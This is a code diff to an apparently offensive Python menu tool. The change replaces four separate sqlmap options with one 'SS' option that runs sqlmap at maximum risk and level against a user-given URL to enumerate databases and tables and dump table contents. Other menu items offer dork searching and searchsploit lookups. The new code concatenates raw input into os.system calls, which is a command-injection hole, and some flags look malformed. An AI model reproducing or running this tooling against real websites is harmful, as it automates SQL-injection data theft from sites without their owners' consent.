@@ -32,10 +32,7 @@ print(Fore.LIGHTYELLOW_EX +"""
 // SQLMAP
 
 [D] google hacking / dorks
-[S] sqli with sqlmap 
-[S2] dbs, --tables
-[S3] dbs, tables, --dump
-[S4] sql with sqlmap (advanced mode)
+[SS] sqli attack with sqlmap 
 [DS] auto scan with dork & sqlmap
 [WS] new window scan with sqlmap & dork (for linux only)
 
@@ -80,27 +77,13 @@ if at == "9" :
    atss = input("exploit => ")
    os.system("searchsploit " + atss +"")
            
-if at == "S" :
-   atsq1 = input("url => ")
-   call(["sqlmap", atsq1 ,"--dbs", "--random-agent"])
-   print(Fore.RED + '[URL]' + atsq1)
-
-if at == "S2" :
-   atsq3 = input("url => ")
-   atdbn = input("database name => ") 
-   call(["sqlmap", atsq3 ,"-D", atdbn, "--tables", "--random-agent"])
-   print(Fore.RED + '[URL]', atsq3 + '\n' + '[DBS]', atdbn)
-           
-if at == "S3" :
-   atsq4 = input("url => ")
-   atdbn2 = input("database name => ") 
-   attb = input("table name => ") 
-   call(["sqlmap", atsq4,"-D", atdbn2, "-T", attb, "--dump", "--random-agent"])
-   print(Fore.RED + '[URL]', atsq4 + '\n' + '[DBS]', atdbn2 + '\n' + '[TAB]', attb)
-
-if at == "S4" :
-   atsq2 = input("url =>")
-   call(["sqlmap", atsq2 ,"--tamper=space2comment,between,space2plus", "-v 2", "--hex", "--random-agent", "--skip-waf", "--risk=3", "--level=3"])
+if at == "SS" :
+   url = input("url => ")
+   os.system("sqlmap -u " + url + " --risk=3 --level=5 --random-agent --answers= y  --user-agent -v3 --batch --threads=10 --dbs")
+   db = input("db name => ")
+   os.system("sqlmap -u " + url + " --risk=3 --level=5 --random-agent --answers= y  --user-agent -v3 --batch --threads=10 -D " + db + " --tables")
+   table = input("table => ")
+   os.system("sqlmap -u " + url + " --risk=3 --level=5 --random-agent --answers= y  --user-agent -v3 --batch --threads=10 -D " + db + " -T" + table + " --dump")
 
 if at == "D" :
    searchterm = input(f'{Fore.GREEN}dork => {Fore.WHITE}')
